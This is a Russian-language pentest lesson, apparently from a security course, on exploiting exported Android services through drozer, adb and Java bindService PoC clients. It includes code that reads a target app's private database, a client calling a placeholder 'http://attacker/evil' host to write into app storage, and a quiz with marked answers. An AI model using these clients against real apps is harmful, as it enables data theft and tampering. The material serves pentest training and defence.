---
id: mobile-service-hijacking
title: "Service hijacking: экспорт и перехват Android-сервисов"
category: mobile
parent: mobile-android-ipc-deep
difficulty: medium
order: 1
tags: [android, service, exported, bindservice, startservice, ipc, permission, hijacking]
prerequisites: [mobile-exported-components]
useful_for:
  - "Пентест мобильных приложений (Android)"
  - "Bug bounty Android"
  - "CTF Mobile"
estimated_minutes: 50
summary: "Атаки на Android Service: экспортированные сервисы, bindService, обход разрешений, перехват и инъекция через implicit intent и Messenger."
---
## Введение

Service в Android — фоновый компонент, выполняющий длительные операции. Если он экспортирован (`android:exported="true"`), любое приложение может запустить его (`startService`), привязаться (`bindService`) или отправить ему команды через `Messenger`/`AIDL`. Часто сервисы реализуют привилегированные операции: скачивание обновлений, синхронизацию, работу с локальной БД, отдачу файлов. Эксплуатация — это выполнение этих операций от имени чужого приложения, обход разрешений или утечка данных через возвращаемые значения Binder.

Отдельный класс — **hijacking**: приложение регистрирует сервис с тем же action, что и целевое, и система выбирает «неправильного» провайдера для неявного `bindService`/`startService` (до Android 5 сервисы вообще можно было перехватывать неявным intent-ом).

## Как выглядят уязвимые сервисы

```xml
<service android:name=".SyncService" android:exported="true">
    <intent-filter>
        <action android:name="com.target.SYNC"/>
    </intent-filter>
</service>

<!-- сервис с защитой по разрешению -->
<service android:name=".AdminService"
         android:exported="true"
         android:permission="com.target.permission.ADMIN"/>
<permission android:name="com.target.permission.ADMIN"
            android:protectionLevel="normal"/>   <!-- normal = защита ноль -->
```

`protectionLevel="normal"` означает, что разрешение выдаётся автоматически при объявлении — фактически защиты нет. `dangerous` требует согласия пользователя, `signature` — подписи того же разработчика.

## Разведка сервисов

```bash
# из манифеста
aapt dump xmltree app.apk AndroidManifest.xml | grep -B2 -A6 "<service"
# через drozer
drozer console connect
dz> run app.service.info -a com.target.app
dz> run app.service.info -a com.target.app -p com.target.permission.ADMIN
dz> run app.service.send com.target.app com.target.app.SyncService \
      --msg 1 2 3 --extra string key value
```

`app.service.send` позволяет отправить произвольное сообщение в Binder-сервис — это основа эксплуатации Messenger/AIDL-сервисов.

## Эксплуатация: start/bind через adb

```bash
# запустить сервис
adb shell am startservice -n com.target.app/.SyncService
adb shell am startservice -a com.target.SYNC

# привязаться (нельзя из adb напрямую, но можно через тестовое приложение)
```

Для `bindService` пишут небольшое приложение-клиент:

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.target.app", "com.target.app.SyncService"));
bindService(i, conn, Context.BIND_AUTO_CREATE);
// conn.onServiceConnected даёт IBinder — вызываем AIDL-методы
```

## Полный сквозной пример: утечка файла через сервис

Дано: экспортированный сервис с AIDL-методом `readFile(String path)`.

```bash
# 1. Разведка
drozer console connect
dz> run app.package.attacksurface com.target.app
# -> Exported Services: 1
dz> run app.service.info -a com.target.app
# -> com.target.app.FileService (exported)
```

2. Пишем клиент, вызывающий AIDL:

```java
IFileService svc = IFileService.Stub.asInterface(service);
String data = svc.readFile("/data/data/com.target.app/databases/app.db");
Log.d("PWN", data);
```

3. Или через drozer, если сервис принимает Parcel:

```bash
dz> run app.service.send com.target.app com.target.app.FileService \
      --msg 1 0 0 --extra string path /data/data/com.target.app/databases/app.db
```

Результат: содержимое приватной БД утекает в недоверенное приложение — находка High. Если метод выполняет `delete`/`write` — это уже целостность данных.

## Перехват неявных сервисов (hijacking)

Если приложение вызывает `startService(new Intent("com.target.SYNC"))` без указания компонента, злоумышленник регистрирует свой сервис с тем же action:

```xml
<service android:name=".EvilService" android:exported="true">
    <intent-filter><action android:name="com.target.SYNC"/></intent-filter>
</service>
```

На современных Android система не даёт «украсть» явный сервис, но при неявном вызове может выбрать чужой — либо вызвать краш. Для пентеста это подтверждает «implicit service intent» как находку.

## Messenger и AIDL

- **Messenger** — обёртка над Binder с `Message` (what/arg1/arg2/Bundle). Атака: отправить `what`, который сервис не ожидает, либо подсунуть `Bundle` с `Parcelable`-эксплойтом (см. `mobile-intent-redirection`).
- **AIDL** — строгий интерфейс. Атака: вызвать метод с произвольными аргументами (path traversal, SQLi, командные операции). Разбор AIDL — в `mobile-android-binder`.

```bash
# отправить Messenger-сообщение
dz> run app.service.send com.target.app com.target.app.MsgService --msg 1 100 200
```

## Частые ошибки

- **Считать `permission` защитой**: `protectionLevel=normal` не защищает.
- **Забыть про `bindService`**: многие уязвимые сервисы доступны только через bind.
- **Проверять только `exported=true`**: сервис с intent-filter мог быть экспортирован неявно.
- **Игнорировать `onStartCommand`**: именно там разбираются extras/actions.
- **Не проверить `android:isolatedProcess`**: он ограничивает, но не отменяет утечек.
- **Тест только на своём устройстве**: без второго приложения не проверить bind.

## Что дальше / решение

Экспортированный сервис без `signature`-разрешения — находка. Проверьте его методы (AIDL/Messenger) на привилегированные операции. Дальше: `mobile-task-hijacking` (UI-redress), `mobile-android-binder` (AIDL deep), `mobile-ipc-fuzzing`. Рекомендация в отчёте: `android:exported="false"` либо `permission` с `signature`-уровнем.

## Справочная таблица

| Метод | Команда |
|-------|---------|
| Список сервисов | `dz> run app.service.info -a pkg` |
| Отправить сообщение | `dz> run app.service.send pkg svc --msg ...` |
| Запустить | `adb shell am startservice -n pkg/.Svc` |
| Surface | `dz> run app.package.attacksurface pkg` |

| protectionLevel | Защита |
|-----------------|--------|
| normal | нет |
| dangerous | согласие пользователя |
| signature | подпись разработчика |
| signatureOrSystem | подпись/система |

## Сквозной кейс: эксплуатация экспортированного AIDL-сервиса

Разберём полный сценарий. Приложение экспортирует сервис `DownloadService` с AIDL-интерфейсом, у которого есть метод `download(String url, String path)`.

Первый этап — разведка. Из манифеста видим `<service android:exported="true" android:name=".DownloadService">`. В декомпилированном коде находим `.aidl`-интерфейс и его реализацию. Смотрим, что делает `download`: скачивает файл по url и сохраняет по path. Если `path` не валидируется — запись в произвольное место (например, в `/data/data/...`), если url не валидируется — SSRF.

Второй этап — подключение. Из adb нельзя напрямую `bindService`, поэтому пишем маленькое приложение-клиент:

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.target.app", "com.target.app.DownloadService"));
bindService(i, new ServiceConnection() {
  public void onServiceConnected(ComponentName c, IBinder b) {
    IDownloadService svc = IDownloadService.Stub.asInterface(b);
    try { svc.download("http://attacker/evil", "/data/data/com.target.app/files/x"); }
    catch (Exception e) {}
  }
  public void onServiceDisconnected(ComponentName c) {}
}, BIND_AUTO_CREATE);
```

Третий этап — эксплуатация. Если метод позволяет перезаписать конфиг приложения или скачать произвольный файл — находка. Проверяем также `path traversal` в path и SSRF в url (доступ к внутренним сервисам).

## Messenger-сервисы

Если сервис использует `Messenger`, отправляем `Message` с `what`/`arg1`/`arg2` и `Bundle`. Часто обработчик не валидирует `what` — можно вызвать неожиданную ветку. `drozer app.service.send` позволяет это без написания клиента:

```bash
dz> run app.service.send com.target.app com.target.app.MsgService --msg 1 0 0
```

## Перехват неявного сервиса

Если приложение стартует сервис неявным Intent-ом (`new Intent("com.target.SYNC")`), регистрируем свой сервис с тем же action. На новых Android система не даст «украсть» явный вызов, но неявный может быть перехвачен или вызвать краш — подтверждение находки.

## Защита

Безопасный сервис: `android:exported="false"` либо `permission` с `signature`-уровнем, валидация всех аргументов (path, url), проверка вызывающего через `Binder.getCallingUid()`. Если сервис не должен быть доступен другим приложениям — он не должен быть экспортирован.

## Чек-лист

Найти экспортированные сервисы, определить их интерфейс (AIDL/Messenger), проверить методы на опасные операции, построить клиент, подтвердить эксплуатацию, оформить с указанием влияния.

## Рекомендации в отчёте

Минимизировать экспорт сервисов, использовать signature-permission, валидировать аргументы, проверять вызывающий UID. Экспортированный сервис с привилегированной операцией — частая находка High.

## Практические советы по сервисам

Начинайте с `drozer app.service.info -a <pkg>` и `app.package.attacksurface` — это карта. Для каждого экспортированного сервиса определите интерфейс: AIDL (`IInterface`) или `Messenger`. AIDL-методы вызывайте из PoC-клиента; Messenger — через `app.service.send`. Проверяйте каждый метод на опасные операции (файлы, сеть, запись).

Обращайте внимание на `protectionLevel` разрешений сервиса: `normal` — фактически нет защиты, `signature` — только тот же разработчик. `signatureOrSystem` — система/подпись.

## BindService vs StartService

Многие уязвимые сервисы доступны только через `bindService` — не ограничивайтесь `am startservice`. Пишите клиент с `ServiceConnection`. Для Messenger-сервисов проверяйте обработку `what`/`Bundle` на неожиданные значения.

## Итог

Экспортированный сервис с привилегированной операцией — частая находка High. Ключ — определить интерфейс, вызвать методы, подтвердить эксплуатацию. Рекомендация: `exported=false` либо signature-permission, валидация аргументов, проверка вызывающего UID.

## Практикум: эксплуатация AIDL-сервиса через PoC-клиент

Разберём полный цикл эксплуатации. Дано: экспортированный сервис `ExportService` с AIDL-методом `exportData(String path)`.

Шаг 1. Извлекаем интерфейс. В декомпилированном коде находим `ExportService.aidl` и сгенерированный `ExportService.Stub`. Смотрим сигнатуру и реализацию `exportData` — что делает с `path`.

Шаг 2. Собираем PoC-клиент. Копируем AIDL в свой проект, реализуем `ServiceConnection`:

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.target.app","com.target.app.ExportService"));
bindService(i, new ServiceConnection(){
  public void onServiceConnected(ComponentName c, IBinder b){
    ExportService s = ExportService.Stub.asInterface(b);
    try { Log.d("PWN", s.exportData("/data/data/com.target.app/databases/app.db")); }
    catch(Exception e){ Log.e("PWN", e.toString()); }
  }
  public void onServiceDisconnected(ComponentName c){}
}, BIND_AUTO_CREATE);
```

Шаг 3. Запускаем, смотрим logcat. Если данные вернулись — сервис отдаёт приватные файлы (High).

Шаг 4. Проверяем path traversal и запись. Если `exportData` пишет по пути — попробуйте перезаписать конфиг приложения. Если читает — прочитать приватную БД.

Шаг 5. Фиксируем в отчёте: сервис, метод, аргументы, результат, рекомендацию (exported=false либо signature-permission).

## Защита

Безопасный сервис не экспортируется либо защищён permission уровня `signature`, валидирует аргументы и проверяет вызывающий UID через `Binder.getCallingUid()`.

## Квиз

```quiz
- question: "Какой protectionLevel разрешения фактически не защищает компонент?"
  options:
    - "signature"
    - "dangerous"
    - "normal"
    - "signatureOrSystem"
  answer: 2
- question: "Какая команда drozer отправляет сообщение в сервис?"
  options:
    - "app.service.info"
    - "app.service.send"
    - "app.activity.start"
    - "app.package.list"
  answer: 1
- question: "Чем опасен экспортированный AIDL-сервис с методом readFile(path)?"
  options:
    - "Позволяет читать приватные файлы приложения"
    - "Ускоряет приложение"
    - "Меняет подпись"
    - "Отключает SELinux"
  answer: 0
- question: "Что такое hijacking неявного сервиса?"
  options:
    - "Регистрация своего сервиса с тем же action для перехвата вызова"
    - "Удаление сервиса"
    - "Перезапуск устройства"
    - "Смена package name"
  answer: 0
- question: "Где обычно разбираются extras/actions сервиса?"
  options:
    - "onCreate"
    - "onStartCommand"
    - "onDestroy"
    - "onBind"
  answer: 1
```

## Где пригодится

- **Пентест Android:** проверка exported-сервисов.
- **Bug bounty:** утечки/привилегированные операции через сервисы.
- **Анализ малвари:** малварь часто регистрирует сервисы для перехвата.
- **CTF:** Mobile-задачи с сервисами.
